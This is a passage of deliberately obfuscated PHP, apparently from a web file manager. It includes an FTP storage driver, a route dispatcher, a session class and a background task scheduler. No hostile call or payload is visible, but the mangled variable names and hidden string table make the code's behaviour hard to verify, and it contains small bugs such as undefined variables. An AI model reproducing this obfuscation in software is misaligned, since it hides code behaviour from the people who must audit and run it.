$°êÎë); } public function delFolder($µ£©é™Ø) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ëé‘‚×¿ = $ëÑ– = array(); $this->fileList($µ£©é™Ø, $ëé‘‚×¿, $ëÑ–, !0); $this->listItemCache = !0; foreach ($ëÑ– as $œ¼éî™÷) { $œººÏ„ = $this->iconvSystem($œ¼éî™÷[$_SERVER[•€áå–Õ][42]]); $£ÖğÈ¸» = @ftp_delete($this->connect, $œººÏ„); if (!$£ÖğÈ¸») { return !1; } } foreach ($ëé‘‚×¿ as $œººÏ„) { $œººÏ„ = $this->iconvSystem($œººÏ„); $£ÖğÈ¸» = @ftp_rmdir($this->connect, $œººÏ„); if (!$£ÖğÈ¸») { return !1; } } $µ£©é™Ø = $this->iconvSystem($µ£©é™Ø); return @ftp_rmdir($this->connect, $µ£©é™Ø); } public function rename($íÂ‰¡³, $ışŸÕÓ) { $ø¨Ï†ğÃ =& $_SERVER[•€áå–Õ]; if (!$this->_isconn()) { return !1; } $‰íÉÁ®ß = $this->fileNameAuto($this->pathFather($íÂ‰¡³), $ışŸÕÓ); $‰íÉÁ®ß = $this->iconvSystem($‰íÉÁ®ß); $íÂ‰¡³ = $this->iconvSystem($íÂ‰¡³); $ÚÙÈ«¥Ä = $this->pathFather($íÂ‰¡³); $ÉÔ´Ğå = rtrim($ÚÙÈ«¥Ä, $ø¨Ï†ğÃ[18]) . $ø¨Ï†ğÃ[18] . $‰íÉÁ®ß; $¯…Êµ¹… = @ftp_rename($this->connect, $íÂ‰¡³, $ÉÔ´Ğå); $ÉÔ´Ğå = $this->iconvApp($ÉÔ´Ğå); return $¯…Êµ¹… ? $this->getPathOuter($ÉÔ´Ğå) : !1; } private function folderInfo($ó§’…¡¢, $ƒ•û¾èì = false) { $ª³íĞş” =& $_SERVER[•€áå–Õ]; $ÄÚãÉÄ” = array($ª³íĞş”[42] => $this->pathThis($ó§’…¡¢), $ª³íĞş”[96] => $this->getPathOuter($ª³íĞş”[18] . $ó§’…¡¢), $ª³íĞş”[43] => $ª³íĞş”[87]); if ($ƒ•û¾èì) { return $ÄÚãÉÄ”; } $ÄÚãÉÄ”[$ª³íĞş”[227]] = $ÄÚãÉÄ”[$ª³íĞş”[97]] = 0; $ÄÚãÉÄ”[$ª³íĞş”[228]] = $ÄÚãÉÄ”[$ª³íĞş”[229]] = !0; return $ÄÚãÉÄ”; } private function fileInfo($»æ¼€¸, $œã›¬Ò = false, $ÆŒü°Ìä = array()) { $Éò¨ü‡ =& $_SERVER[•€áå–Õ]; $›š‹¢œ¾ = array($Éò¨ü‡[42] => $this->pathThis($»æ¼€¸), $Éò¨ü‡[96] => $this->getPathOuter($Éò¨ü‡[18] . $»æ¼€¸), $Éò¨ü‡[43] => $Éò¨ü‡[226], $Éò¨ü‡[88] => isset($ÆŒü°Ìä[$Éò¨ü‡[88]]) ? $ÆŒü°Ìä[$Éò¨ü‡[88]] : 0, $Éò¨ü‡[187] => $this->ext($»æ¼€¸)); if ($œã›¬Ò) { return $›š‹¢œ¾; } $›š‹¢œ¾[$Éò¨ü‡[227]] = $›š‹¢œ¾[$Éò¨ü‡[97]] = 0; $›š‹¢œ¾[$Éò¨ü‡[228]] = $›š‹¢œ¾[$Éò¨ü‡[229]] = !0; $¢êáÄà» = $this->iconvSystem($»æ¼€¸); $›š‹¢œ¾[$Éò¨ü‡[97]] = @ftp_mdtm($this->connect, $¢êáÄà»); if (empty($ÆŒü°Ìä)) { $ÆŒü°Ìä = $this->objectMeta($»æ¼€¸); if (!$ÆŒü°Ìä) { return $›š‹¢œ¾; } } $›š‹¢œ¾[$Éò¨ü‡[88]] = $ÆŒü°Ìä[$Éò¨ü‡[88]]; return $›š‹¢œ¾; } public function size($ëş‘ìœ) { $Ï½óºÕì = $this->objectMeta($ëş‘ìœ); return $Ï½óºÕì ? $Ï½óºÕì[$_SERVER[•€áå–Õ][88]] : 0; } public function info($µñîèö) { if ($this->isFile($µñîèö)) { return $this->fileInfo($µñîèö, 0); } else { if ($this->isFolder($µñîèö)) { return $this->folderInfo($µñîèö); } } return !1; } private function fileList($á»©§‰â, &$¤ö¹±üë, &$ÎèèãÊª, $æ—Áç³÷ = false) { $¡Ñ†ŸáÈ =& $_SERVER[•€áå–Õ]; $á»©§‰â = $this->iconvSystem($á»©§‰â); if (!$this->isFolder($á»©§‰â)) { return !1; } @ftp_chdir($this->connect, $¡Ñ†ŸáÈ[18]); $á»©§‰â = rtrim($á»©§‰â, $¡Ñ†ŸáÈ[18]) . $¡Ñ†ŸáÈ[18]; check_abort(); $¥¯Æ€Ş = @ftp_rawlist($this->connect, $á»©§‰â); if (!$¥¯Æ€Ş) { $¥¯Æ€Ş = array(); } $É£Ş»¹ = array($¡Ñ†ŸáÈ[20] => 1, $¡Ñ†ŸáÈ[1319] => 1); foreach ($¥¯Æ€Ş as $ùÒùş) { $Îˆş¹¿ = $this->_listItem($ùÒùş); if ($Îˆş¹¿[0] == $¡Ñ†ŸáÈ[799]) { continue; } $‚³å•îÃ = $Îˆş¹¿[8]; if (empty($‚³å•îÃ) && $‚³å•îÃ !== $¡Ñ†ŸáÈ[224] || isset($É£Ş»¹[$‚³å•îÃ])) { continue; } $‚³å•îÃ = $this->iconvApp($á»©§‰â . ltrim($‚³å•îÃ, $¡Ñ†ŸáÈ[18])); $º³«ìíË = array($¡Ñ†ŸáÈ[42] => $‚³å•îÃ, $¡Ñ†ŸáÈ[43] => $¡Ñ†ŸáÈ[226], $¡Ñ†ŸáÈ[88] => $Îˆş¹¿[4]); if (substr($ùÒùş, 0, 1) == $¡Ñ†ŸáÈ[1402]) { $º³«ìíË[$¡Ñ†ŸáÈ[43]] = $¡Ñ†ŸáÈ[87]; $º³«ìíË[$¡Ñ†ŸáÈ[88]] = 0; } $ÊÙ‚ıÛà = $º³«ìíË[$¡Ñ†ŸáÈ[43]] == $¡Ñ†ŸáÈ[87] ? !0 : !1; $this->cacheMethodInfoSet($‚³å•îÃ, $ÊÙ‚ıÛà, $º³«ìíË); if ($ÊÙ‚ıÛà) { $¤ö¹±üë[] = $‚³å•îÃ; if ($æ—Áç³÷) { $this->fileList($‚³å•îÃ, $¤ö¹±üë, $ÎèèãÊª, $æ—Áç³÷); } continue; } $ÎèèãÊª[] = $º³«ìíË; } $this->cacheMethodInfoSet($á»©§‰â, !0); } private function _listItem($È‡ü…¬Ì) { if (empty($È‡ü…¬Ì)) { return array(); } $ˆ“ø©ƒ = preg_split($_SERVER[•€áå–Õ][1403], $È‡ü…¬Ì); if (count($ˆ“ø©ƒ) <= 9) { return $ˆ“ø©ƒ; } $ˆ“ø©ƒ[8] = trim(substr($È‡ü…¬Ì, strpos($È‡ü…¬Ì, $ˆ“ø©ƒ[7]) + strlen($ˆ“ø©ƒ[7]))); return array_splice($ˆ“ø©ƒ, 0, 9); } public function listPath($åğ„†¢Ä, $œÃ¥óğ¤ = false) { $®ê¡áƒ =& $_SERVER[•€áå–Õ]; if (!$this->_isconn()) { return !1; } $ÌÌÒÍ‚ñ = $ëÅüïœÜ = array(); $this->fileList($åğ„†¢Ä, $ÌÌÒÍ‚ñ, $ëÅüïœÜ); foreach ($ÌÌÒÍ‚ñ as $ŒÒŸ¿ò => $êÍı»ü™) { $ÌÌÒÍ‚ñ[$ŒÒŸ¿ò] = $this->folderInfo($êÍı»ü™, $œÃ¥óğ¤); } foreach ($ëÅüïœÜ as $ŒÒŸ¿ò => $êÍı»ü™) { $ëÅüïœÜ[$ŒÒŸ¿ò] = $this->fileInfo($êÍı»ü™[$®ê¡áƒ[42]], $œÃ¥óğ¤, $êÍı»ü™); } return array($®ê¡áƒ[94] => $ÌÌÒÍ‚ñ, $®ê¡áƒ[95] => $ëÅüïœÜ); } public function has($„ßº“ğ­, $Æ¦¤Â¹è = false, $ø’Ìßû“ = true) { $–‘©²ê¡ =& $_SERVER[•€áå–Õ]; $®·âÜ‘ò = $õàû¢’¦ = array(); $öæ»ÜÈ = $Æ¦¤Â¹è ? !0 : !1; $this->fileList($„ßº“ğ­, $®·âÜ‘ò, $õàû¢’¦, $öæ»ÜÈ); if ($Æ¦¤Â¹è) { return array($–‘©²ê¡[235] => count($õàû¢’¦), $–‘©²ê¡[236] => count($®·âÜ‘ò)); } if ($ø’Ìßû“) { if (count($õàû¢’¦)) { return !0; } } else { if (count($®·âÜ‘ò)) { return !0; } } return !1; } public function listAll($Íàœ¨ö÷) { $ÕÒğßó¬ =& $_SERVER[•€áå–Õ]; if (!$this->_isconn()) { return !1; } $ïù…Ë·¼ = $ª¾Àí = array(); $this->fileList($Íàœ¨ö÷, $ïù…Ë·¼, $ª¾Àí, !0); $˜®Šİºš = array_to_keyvalue($ª¾Àí, $ÕÒğßó¬[42]); foreach ($ïù…Ë·¼ as $–Û¯õì×) { if (is_string($–Û¯õì×)) { $˜®Šİºš[$–Û¯õì×] = array($ÕÒğßó¬[88] => 0); } } return $this->listAllFiles($Íàœ¨ö÷, $˜®Šİºš); } public function getContent($¶ÆÔûì) { if (!$this->_isconn()) { return !1; } $¶ÆÔûì = $this->iconvSystem($¶ÆÔûì); return $this->fileSubstr($¶ÆÔûì); } public function setContent($ğÓÂª™, $á¾è±ÀÌ = '') { if (!$this->_isconn()) { return !1; } $†ªÉİ´Â = $this->pathThis($this->iconvSystem($ğÓÂª™)); $˜şŸÁ‰˜ = $this->tempFile($†ªÉİ´Â); file_put_contents($˜şŸÁ‰˜, $á¾è±ÀÌ); $¡¿˜£ = $this->upload($ğÓÂª™, $this->iconvApp($˜şŸÁ‰˜)); $this->tempFileRemve($˜şŸÁ‰˜); return $¡¿˜£; } public function fileSubstr($¶şëí—ş, $ıçå÷¶ö = 0, $œ¯ë¥È¯ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¶şëí—ş, $ıçå÷¶ö, $œ¯ë¥È¯); } private function ftpRequest($ê¸ÏÓ³, $˜‘„Š¾ = 0, $úéö†šÆ = false) { $ê¸ÏÓ³ = $this->iconvSystem($ê¸ÏÓ³); $Ç¸˜ÔÍº = $this->scheme . $this->host . $_SERVER[•€áå–Õ][4] . $this->port; $ñû˜Ë… = curl_init(); curl_setopt($ñû˜Ë…, CURLOPT_URL, $Ç¸˜ÔÍº . $this->pathEncode($ê¸ÏÓ³)); curl_setopt($ñû˜Ë…, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($úéö†šÆ) { $ó¤Ä¥ôõ = $˜‘„Š¾ + $úéö†šÆ - 1; curl_setopt($ñû˜Ë…, CURLOPT_RANGE, "{$˜‘„Š¾}\x2d{$ó¤Ä¥ôõ}"); } curl_setopt($ñû˜Ë…, CURLOPT_RETURNTRANSFER, 1); $¡ÇÜ½Ú = curl_exec($ñû˜Ë…); curl_close($ñû˜Ë…); return $¡ÇÜ½Ú; } public function upload($Éşá¼çå, $“ñŸ‡†Æ, $²¯“ñëß = false, $öØåş”Ê = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Éşá¼çå))) { return !1; } $Éşá¼çå = $this->iconvSystem($Éşá¼çå); $“ñŸ‡†Æ = $this->iconvSystem($“ñŸ‡†Æ); $ÖëàÚ¼¡ = ftp_nb_put($this->connect, $Éşá¼çå, $“ñŸ‡†Æ, FTP_BINARY); while ($ÖëàÚ¼¡ == FTP_MOREDATA) { $ÖëàÚ¼¡ = ftp_nb_continue($this->connect); } if ($ÖëàÚ¼¡ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Éşá¼çå); } public function download($äÉÕµ„, $²çµñÕ¥ = '') { if (!$this->_isconn()) { return !1; } $İÑÅšÌ = $this->pathFather($²çµñÕ¥); if (!IO::mkdir($İÑÅšÌ)) { return !1; } $äÉÕµ„ = $this->iconvSystem($äÉÕµ„); $²çµñÕ¥ = $this->iconvSystem($²çµñÕ¥); $èöõÄÈ± = ftp_nb_get($this->connect, $²çµñÕ¥, $äÉÕµ„, FTP_BINARY); while ($èöõÄÈ± == FTP_MOREDATA) { $èöõÄÈ± = ftp_nb_continue($this->connect); } if ($èöõÄÈ± != FTP_FINISHED) { return !1; } return $this->iconvApp($²çµñÕ¥); } public function exist($ÌÜ¤Åˆ×) { return $this->isFile($ÌÜ¤Åˆ×) || $this->isFolder($ÌÜ¤Åˆ×); } public function isFile($ùäßëó») { return !$this->isFolder($ùäßëó») && $this->objectMeta($ùäßëó»); } public function isFolder($€ıŒàú±) { return $this->cacheMethod($_SERVER[•€áå–Õ][178], $€ıŒàú±); } protected function objectMeta($†„ÆäÎ) { return $this->cacheMethod($_SERVER[•€áå–Õ][180], $†„ÆäÎ); } protected function _objectMeta($ó¿»Ä°¦) { $´€£èéë =& $_SERVER[•€áå–Õ]; if ($ó¿»Ä°¦ == $´€£èéë[22] || $ó¿»Ä°¦ == $´€£èéë[18]) { return array(); } if (!$this->_isconn()) { return !1; } $ó¿»Ä°¦ = $this->iconvSystem($ó¿»Ä°¦); $Á«ô× = array($´€£èéë[42] => $this->iconvApp($ó¿»Ä°¦), $´€£èéë[43] => $´€£èéë[226], $´€£èéë[88] => 0); @ftp_chdir($this->connect, $´€£èéë[18]); $Íçõ´­Ö = @ftp_size($this->connect, $ó¿»Ä°¦); if ($Íçõ´­Ö != -1) { $Á«ô×[$´€£èéë[88]] = $Íçõ´­Ö; } else { $Ä ‡É¦œ = @ftp_chdir($this->connect, $ó¿»Ä°¦); if (!$Ä ‡É¦œ) { return !1; } $Á«ô×[$´€£èéë[43]] = $´€£èéë[87]; } return $Á«ô×; } protected function _isFolder($ı·¾†£) { $ôóËçĞõ =& $_SERVER[•€áå–Õ]; if ($ı·¾†£ == $ôóËçĞõ[22] || $ı·¾†£ == $ôóËçĞõ[18]) { return !0; } $œï”¬Ôõ = $this->_objectMeta($ı·¾†£); return isset($œï”¬Ôõ[$ôóËçĞõ[43]]) && $œï”¬Ôõ[$ôóËçĞõ[43]] == $ôóËçĞõ[87] ? !0 : !1; } } goto cÑàãÒ—ˆ; bÎÆšµšô: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\133\136\x2f\135\x2b", "\x3a\x6e\x75\155" => "\x5b\x30\55\x39\135\x2b", "\72\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($úˆ‹Â¦, $÷»Êïî) { $‚èû€ªã =& $_SERVER[•€áå–Õ]; if ($úˆ‹Â¦ == $‚èû€ªã[1629]) { $Â‹Ä“¢ = array_map($‚èû€ªã[1630], $÷»Êïî[0]); $ÏñÍüÄ¶ = strpos($÷»Êïî[1], $‚èû€ªã[18]) === 0 ? $÷»Êïî[1] : $‚èû€ªã[18] . $÷»Êïî[1]; $ƒÃ²‘€ = $÷»Êïî[2]; } else { $Â‹Ä“¢ = null; $ÏñÍüÄ¶ = strpos($÷»Êïî[0], $‚èû€ªã[18]) === 0 ? $÷»Êïî[0] : $‚èû€ªã[18] . $÷»Êïî[0]; $ƒÃ²‘€ = $÷»Êïî[1]; } array_push(self::$maps, $Â‹Ä“¢); array_push(self::$routes, $ÏñÍüÄ¶); array_push(self::$methods, strtoupper($úˆ‹Â¦)); array_push(self::$callbacks, $ƒÃ²‘€); } public static function error($Éõ§äî©) { self::$errorCallback = $Éõ§äî©; } public static function haltOnMatch($Â¤Š”†À = true) { self::$halts = $Â¤Š”†À; } public static function dispatch() { $ÚôË·ô =& $_SERVER[•€áå–Õ]; $Û‡ÏÇ¼ = parse_url($_SERVER[$ÚôË·ô[1631]], PHP_URL_PATH); $í£Ç—ßü = $_SERVER[$ÚôË·ô[172]]; $ÌüûÕõå = array_keys(static::$patterns); $¸“õ äñ = array_values(static::$patterns); $Òû’é’ = !1; self::$routes = preg_replace($ÚôË·ô[1317], $ÚôË·ô[18], self::$routes); if (in_array($Û‡ÏÇ¼, self::$routes)) { $‚¢Éıœ = array_keys(self::$routes, $Û‡ÏÇ¼); foreach ($‚¢Éıœ as $ïšÚÖ·Ë) { if (self::$methods[$ïšÚÖ·Ë] == $í£Ç—ßü || self::$methods[$ïšÚÖ·Ë] == $ÚôË·ô[1632] || in_array($í£Ç—ßü, self::$maps[$ïšÚÖ·Ë])) { $Òû’é’ = !0; if (!is_object(self::$callbacks[$ïšÚÖ·Ë])) { $˜ÀúÂÃõ = explode($ÚôË·ô[18], self::$callbacks[$ïšÚÖ·Ë]); $„Öñòş¤ = end($˜ÀúÂÃõ); $Õğ¯ù„¹ = explode($ÚôË·ô[1249], $„Öñòş¤); $”©ùºªĞ = new $Õğ¯ù„¹[0](); $”©ùºªĞ->{$Õğ¯ù„¹[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ïšÚÖ·Ë]); if (self::$halts) { return; } } } } } else { $ÅáÆ£Åò = 0; foreach (self::$routes as $ïšÚÖ·Ë) { if (strpos($ïšÚÖ·Ë, $ÚôË·ô[4]) !== !1) { $ïšÚÖ·Ë = str_replace($ÌüûÕõå, $¸“õ äñ, $ïšÚÖ·Ë); } if (preg_match($ÚôË·ô[1633] . $ïšÚÖ·Ë . $ÚôË·ô[1634], $Û‡ÏÇ¼, $—ÍÓ’„)) { if (self::$methods[$ÅáÆ£Åò] == $í£Ç—ßü || self::$methods[$ÅáÆ£Åò] == $ÚôË·ô[1632] || !empty(self::$maps[$ÅáÆ£Åò]) && in_array($í£Ç—ßü, self::$maps[$ÅáÆ£Åò])) { $Òû’é’ = !0; array_shift($—ÍÓ’„); if (!is_object(self::$callbacks[$ÅáÆ£Åò])) { $˜ÀúÂÃõ = explode($ÚôË·ô[18], self::$callbacks[$ÅáÆ£Åò]); $„Öñòş¤ = end($˜ÀúÂÃõ); $Õğ¯ù„¹ = explode($ÚôË·ô[1249], $„Öñòş¤); $”©ùºªĞ = new $Õğ¯ù„¹[0](); if (!method_exists($”©ùºªĞ, $Õğ¯ù„¹[1])) { echo $ÚôË·ô[1635]; } else { call_user_func_array(array($”©ùºªĞ, $Õğ¯ù„¹[1]), $—ÍÓ’„); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ÅáÆ£Åò], $—ÍÓ’„); if (self::$halts) { return; } } } } $ÅáÆ£Åò++; } } if ($Òû’é’ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $´¯”—ù’ =& $_SERVER[•€áå–Õ]; header($_SERVER[$´¯”—ù’[1636]] . $´¯”—ù’[1637]); echo $´¯”—ù’[1638]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ÚôË·ô[1631]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $·½÷œèÛ =& $_SERVER[•€áå–Õ]; static $Àœû¶Î = false; if ($Àœû¶Î) { return $Àœû¶Î; } $ç¢¯»µä = $GLOBALS[$·½÷œèÛ[16]][$·½÷œèÛ[404]]; self::$sessionTime = $ç¢¯»µä[$·½÷œèÛ[1639]]; $à²Â“ñ¿ = isset($GLOBALS[$·½÷œèÛ[1640]]) ? $GLOBALS[$·½÷œèÛ[1640]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($à²Â“ñ¿)) { self::$sessionSign = Cookie::get($à²Â“ñ¿); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($à²Â“ñ¿, self::$sessionSign, self::$sessionTime); $­‹±¨ÎÊ = $ç¢¯»µä[$·½÷œèÛ[1641]]; $Û¯Í¹ô× = $ç¢¯»µä[$­‹±¨ÎÊ]; $àæ©µñ¢ = $ç¢¯»µä[$·½÷œèÛ[869]]; switch ($­‹±¨ÎÊ) { case $·½÷œèÛ[31]: self::$handle = Model($·½÷œèÛ[870]); break; case $·½÷œèÛ[871]: self::$handle = new CacheRedis($Û¯Í¹ô×, $àæ©µñ¢); break; case $·½÷œèÛ[872]: self::$handle = new CacheMemcached($Û¯Í¹ô×, $àæ©µñ¢); break; case $·½÷œèÛ[226]: $Û¯Í¹ô×[$·½÷œèÛ[96]] = $Û¯Í¹ô×[$·½÷œèÛ[96]] . $·½÷œèÛ[1642]; self::$handle = new CacheFile($Û¯Í¹ô×, $àæ©µñ¢); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Àœû¶Î = new self(); return $Àœû¶Î; } public static function getBySign($’…úøã) { $ı­œ»¦Ã = self::$handle->get($’…úøã); $ı­œ»¦Ã = unserialize($ı­œ»¦Ã); return is_array($ı­œ»¦Ã) ? $ı­œ»¦Ã : array(); } public static function setBySign($ªü‡íù§, $Ã“ÃÔªÍ) { CacheLock::lock($ªü‡íù§); self::$handle->set($ªü‡íù§, serialize($Ã“ÃÔªÍ), self::$sessionTime); CacheLock::unlock($ªü‡íù§); } public static function sign($Û· ÇÉş = false) { if ($Û· ÇÉş) { self::$sessionSign = $Û· ÇÉş; } self::init(); return self::$sessionSign; } public static function set($ÕÁäÖ„Û, $ÅñÅ´ñ = false) { self::init(); if (is_array($ÕÁäÖ„Û)) { foreach ($ÕÁäÖ„Û as $ù†âˆÔÑ => $´µÀÉöâ) { array_set_value(self::$data, $ù†âˆÔÑ, $´µÀÉöâ); } } else { array_set_value(self::$data, $ÕÁäÖ„Û, $ÅñÅ´ñ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($½ì¥êşÁ = false) { self::init(); if (!$½ì¥êşÁ) { return self::$data; } return array_get_value(self::$data, $½ì¥êşÁ); } public static function remove($…Ö˜‰Âú) { self::init(); unset(self::$data[$…Ö˜‰Âú]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[•€áå–Õ][875])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $õñ®ºë² =& $_SERVER[•€áå–Õ]; if (self::valueGet($õñ®ºë²[791]) != $õñ®ºë²[100]) { return; } if (self::valueGet($õñ®ºë²[1643]) == $õñ®ºë²[100]) { $ş€¼º÷Í = self::valueGet($õñ®ºë²[1644]); if (time() - $ş€¼º÷Í > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($õñ®ºë²[1643], $õñ®ºë²[100]); self::log($õñ®ºë²[1645] . ACTION . $õñ®ºë²[1646]); Hook::bind($õñ®ºë²[1647], $õñ®ºë²[1648]); $ç—£œƒî = 0; while (!0) { self::cacheClear(); if (self::valueGet($õñ®ºë²[791]) != $õñ®ºë²[100]) { self::valueSet($õñ®ºë²[1643], $õñ®ºë²[224]); self::log($õñ®ºë²[1649]); die; } $¸ÌÇ› = time(); if ($¸ÌÇ› - $ç—£œƒî >= 60) { self::valueSet(array($õñ®ºë²[1643] => $õñ®ºë²[100], $õñ®ºë²[1644] => $¸ÌÇ›)); $ç—£œƒî = $¸ÌÇ›; } if (!file_exists(USER_SYSTEM . $õñ®ºë²[1650])) { self::valueSet(array($õñ®ºë²[1643] => $õñ®ºë²[224], $õñ®ºë²[791] => $õñ®ºë²[224])); self::log($õñ®ºë²[1651]); die; } $›êÎÇú› = file_get_contents(BASIC_PATH . $õñ®ºë²[1652]); $úÖşªü = KOD_VERSION . $õñ®ºë²[20] . KOD_VERSION_BUILD; $„ËƒÊ²ü = match_text($›êÎÇú›, $õñ®ºë²[1653]) . $õñ®ºë²[20] . match_text($›êÎÇú›, $õñ®ºë²[1654]); if ($„ËƒÊ²ü != $úÖşªü) { self::restart(); self::log("\163\164\157\160\145\x64\56\x5b\166\x65\x72\x73\151\157\x6e\40\x75\160\x64\141\x74\145\73{$versionNow}\x20\x3d\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Ã¡½‡É =& $_SERVER[•€áå–Õ]; http_close(); $GLOBALS[$Ã¡½‡É[1655]] = 1; $_SERVER[$Ã¡½‡É[1656]] = $Ã¡½‡É[1657]; $_COOKIE = array(); $GLOBALS[$Ã¡½‡É[1658]] = 1; $GLOBALS[$Ã¡½‡É[1659]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Í“‰¡ò =& $_SERVER[•€áå–Õ]; http_close(); self::valueSet($Í“‰¡ò[791], $Í“‰¡ò[224]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Í“‰¡ò[1643] => $Í“‰¡ò[224], $Í“‰¡ò[791] => $Í“‰¡ò[100])); self::log($Í“‰¡ò[1660]); } public static function taskSwitch() { $ÕÕ±Ï =& $_SERVER[•€áå–Õ]; $Š×·š = self::valueGet($ÕÕ±Ï[791]) == $ÕÕ±Ï[100] ? $ÕÕ±Ï[224] : $ÕÕ±Ï[100]; self::valueSet($ÕÕ±Ï[791], $Š×·š); } public static function shutdownEvent() { $¬çÏ™èª =& $_SERVER[•€áå–Õ]; self::valueSet($¬çÏ™èª[1643], $¬çÏ™èª[224]); self::log($¬çÏ™èª[1661]); } public static function config($èÙ¡°œ•, $‰àğŒúü) { self::valueSet($_SERVER[•€áå–Õ][791], $èÙ¡°œ•); } private static function taskRunAll() { $üÕÆÇ¬ =& $_SERVER[•€áå–Õ]; $³¾‡‚×˜ = timeFloat(); $Ò«àÕ•å = Model($üÕÆÇ¬[1662])->listData(); $¼‘Ï¨ü = count($Ò«àÕ•å); for ($åñ’™ÚÛ = 0; $åñ’™ÚÛ < $¼‘Ï¨ü; $åñ’™ÚÛ++) { $ƒãïşÉÊ = $Ò«àÕ•å[$åñ’™ÚÛ]; if (!$ƒãïşÉÊ[$üÕÆÇ¬[454]] || $ƒãïşÉÊ[$üÕÆÇ¬[1663]] != $üÕÆÇ¬[100]) { continue; } if (!self::taskTimeCheck($ƒãïşÉÊ)) { continue; } self::taskRun($ƒãïşÉÊ); } Hook::trigger($üÕÆÇ¬[1664]); self::taskQueueRun($³¾‡‚×˜); } private static function taskQueueRun($Ì…Ôœ‰ö) { $êÓ»½Î = 10; while (!0) { $È°ßã = TaskQueue::run(); if ($È°ßã === !1) { break; } if (timeFloat() - $Ì…Ôœ‰ö >= $êÓ»½Î) { break; } } } private static function taskTimeCheck($¾¦´ô¸œ) { $Ç¾íÑ’ö =& $_SERVER[•€áå–Õ]; $¤¼¤ˆÃ¥ = json_decode($¾¦´ô¸œ[$Ç¾íÑ’ö[206]], !0); $“Ü¤ëöğ = intval($¾¦´ô¸œ[$Ç¾íÑ’ö[1644]]); $¿®Â·õ = strtotime($Ç¾íÑ’ö[1665] . $¤¼¤ˆÃ¥[$Ç¾íÑ’ö[1666]] . $Ç¾íÑ’ö[1667]) - strtotime($Ç¾íÑ’ö[1668]); $²üŠ¹¦ = time() - strtotime(date($Ç¾íÑ’ö[1669]) . $Ç¾íÑ’ö[1670]); $äïÈé€ß = $²üŠ¹¦ >= $¿®Â·õ && $²üŠ¹¦ <= $¿®Â·õ + 3600; switch ($¤¼¤ˆÃ¥[$Ç¾íÑ’ö[43]]) { case $Ç¾íÑ’ö[1671]: if (time() - $“Ü¤ëöğ < 3600 * 24 * 30) { return !1; } if ($¤¼¤ˆÃ¥[$Ç¾íÑ’ö[1671]] == date($Ç¾íÑ’ö[1672]) && $äïÈé€ß) { return !0; } break; case $Ç¾íÑ’ö[1673]: if (time() - $“Ü¤ëöğ < 3600 * 24 * 7) { return !1; } $í–›¥ŠÚ = date($Ç¾íÑ’ö[1674]) == 0 ? 7 : date($Ç¾íÑ’ö[1674]); if ($¤¼¤ˆÃ¥[$Ç¾íÑ’ö[1673]] == $í–›¥ŠÚ && $äïÈé€ß) { return !0; } break; case $Ç¾íÑ’ö[1666]: if (time() - $“Ü¤ëöğ < 3600 * 24) { return !1; } if ($äïÈé€ß) { return !0; } break; case $Ç¾íÑ’ö[1675]: if (time() - $“Ü¤ëöğ >= floatval($¤¼¤ˆÃ¥[$Ç¾íÑ’ö[1675]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¯»ÈÖûõ =& $_SERVER[•€áå–Õ]; static $¼ÂåÊæÚ = 0; $íß“£Ø = 300; if (!$¼ÂåÊæÚ) { $¼ÂåÊæÚ = time(); } if (time() - $¼ÂåÊæÚ < $íß“£Ø) { return; } $¼ÂåÊæÚ = time(); $ŸƒÕ”×³ = Model($¯»ÈÖûõ[557])->db($¯»ÈÖûõ[22]); if ($ŸƒÕ”×³) { $ŸƒÕ”×³->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¯»ÈÖûõ[1676], $¯»ÈÖûõ[1677]); die; } } public static function taskRun($Ç™ı™Ñ) { $Èš¤Ïå =& $_SERVER[•€áå–Õ]; self::log($Èš¤Ïå[1678] . $Ç™ı™Ñ[$Èš¤Ïå[454]] . $Èš¤Ïå[1679] . $Ç™ı™Ñ[$Èš¤Ïå[42]] . $Èš¤Ïå[1680] . $Ç™ı™Ñ[$Èš¤Ïå[1681]]); Model($Èš¤Ïå[1662])->run($Ç™ı™Ñ[$Èš¤Ïå[454]]); $ƒ¬“¸ÏÂ = timeFloat(); $¿°‡ÛÆ” = $Èš¤Ïå[22]; switch ($Ç™ı™Ñ[$Èš¤Ïå[43]]) { case $Èš¤Ïå[362]: $ÅŒ†…·ˆ = url_request($Ç™ı™Ñ[$Èš¤Ïå[1681]], $Èš¤Ïå[257], !1, !1, !1, !1, 10); if ($ÅŒ†…·ˆ[$Èš¤Ïå[791]]) { $¿°‡ÛÆ” = strlen($ÅŒ†…·ˆ[$Èš¤Ïå[1243]]); } break; case $Èš¤Ïå[256]: $¿°‡ÛÆ” = 